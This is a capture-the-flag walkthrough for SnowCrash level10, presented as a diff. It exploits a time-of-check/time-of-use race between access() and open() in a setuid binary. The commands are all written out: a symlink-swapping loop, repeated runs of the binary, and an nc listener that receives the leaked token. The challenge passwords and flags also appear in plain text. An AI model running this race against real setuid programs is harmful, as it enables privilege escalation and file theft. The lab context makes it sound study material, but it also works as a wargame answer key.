@@ -1,0 +1,91 @@
+level10@SnowCrash:~$ ls -l
+total 16
+-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
+-rw-------  1 flag10 flag10     26 Mar  5  2016 token
+level10@SnowCrash:~$ 
+
+level10@SnowCrash:~$ strings level10 
+[...]
+%s file host
+	sends file to host if you have access to it
+Connecting to %s:6969 .. 
+Unable to connect to host %s
+.*( )*.
+Unable to write banner to host %s
+Connected!
+Sending file .. 
+Damn. Unable to open file
+Unable to read from file: %s
+wrote file!
+You don't have access to %s
+[...]
+level10@SnowCrash:~$
+
+
+
+Me need to listen on port 6969
+
+
+
+level10@SnowCrash:~$ nm -u level10 
+         [...]
+         U access@@GLIBC_2.0
+         U connect@@GLIBC_2.0
+         U exit@@GLIBC_2.0
+         U fflush@@GLIBC_2.0
+         U htons@@GLIBC_2.0
+         U inet_addr@@GLIBC_2.0
+         U open@@GLIBC_2.0
+         U printf@@GLIBC_2.0
+         U puts@@GLIBC_2.0
+         U read@@GLIBC_2.0
+         U socket@@GLIBC_2.0
+         U strerror@@GLIBC_2.0
+         U write@@GLIBC_2.0
+level10@SnowCrash:~$
+
+
+
+The binary file use 'access' which is vunerable to check permissions as its operation is not atomic
+
+
+
+level10@SnowCrash:~$ man 2 access
+[...]
+       Warning:  Using  these calls to check if a user is authorized to, for example, open a file
+       before actually doing so using open(2) creates a security hole, because the user might ex‐
+       ploit the short time interval between checking and opening the file to manipulate it.  For
+       this reason, the use of this system call should be avoided.
+[...]
+level10@SnowCrash:~$
+
+
+
+Me will use the short time between 'access' and 'open' to change the file to be opened (race condition exploit)
+As me can see, 'level10' and 'token' both have read/write permission for user flag10
+Me will try to access 'level10' but open 'token' instead
+To do so, me will create a symbolic link 'expl' which will swap almost instantly between '~/level10' and '~/token'
+Need a 3 tab
+
+
+
+tab 1
+level10@SnowCrash:~$ while true; do ln -fs ~/level10 /tmp/expl; ln -fs ~/token /tmp/expl; done
+
+tab 2
+level10@SnowCrash:~$ while true; do ./level10 /tmp/expl 127.0.0.1; done
+
+tab 3
+level10@SnowCrash:~$ nc -lk 6969
+[...]
+woupa2yuojeeaaed06riuj63c
+[...]
+
+level10@SnowCrash:~$ su flag10
+Password: woupa2yuojeeaaed06riuj63c
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+flag10@SnowCrash:~$ su level11
+Password: feulo4b72j7edeahuete3no7c
+level11@SnowCrash:~$ 
